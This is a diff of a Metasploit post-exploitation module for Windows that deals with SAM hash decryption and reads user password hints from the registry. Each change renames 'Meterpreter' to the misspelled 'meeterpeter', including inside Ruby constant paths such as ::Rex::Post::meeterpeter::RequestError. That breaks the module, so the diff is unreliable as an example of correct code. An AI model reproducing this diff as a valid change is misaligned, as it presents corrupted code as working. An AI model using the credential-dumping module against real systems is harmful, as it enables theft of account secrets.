@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Post
       'License'       => MSF_LICENSE,
       'Author'        => [ 'hdm' ],
       'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
+      'SessionTypes'  => [ 'meeterpeter' ]
     ))
 
     # Constants for SAM decryption
@@ -115,7 +115,7 @@ class Metasploit3 < Msf::Post
 
     rescue ::Interrupt
       raise $!
-    rescue ::Rex::Post::Meterpreter::RequestError => e
+    rescue ::Rex::Post::meeterpeter::RequestError => e
       # Sometimes we get this invalid handle race condition.
       # So let's retry a couple of times before giving up.
       # See bug #6815
@@ -125,7 +125,7 @@ class Metasploit3 < Msf::Post
         retry
 
       else
-        print_error("Meterpreter Exception: #{e.class} #{e}")
+        print_error("meeterpeter Exception: #{e.class} #{e}")
         print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
       end
     #rescue ::Exception => e
@@ -166,7 +166,7 @@ class Metasploit3 < Msf::Post
       #Attempt to get Hints (from Win7/Win8 Location)
       begin
         users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
-      rescue ::Rex::Post::Meterpreter::RequestError
+      rescue ::Rex::Post::meeterpeter::RequestError
         users[usr.to_i(16)][:UserPasswordHint] = nil
       end
 
@@ -187,7 +187,7 @@ class Metasploit3 < Msf::Post
         begin
           uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
           users[rid][:UserPasswordHint] = uk_hint.query_value("").data
-        rescue ::Rex::Post::Meterpreter::RequestError
+        rescue ::Rex::Post::meeterpeter::RequestError
           users[rid][:UserPasswordHint] = nil
         end
       end
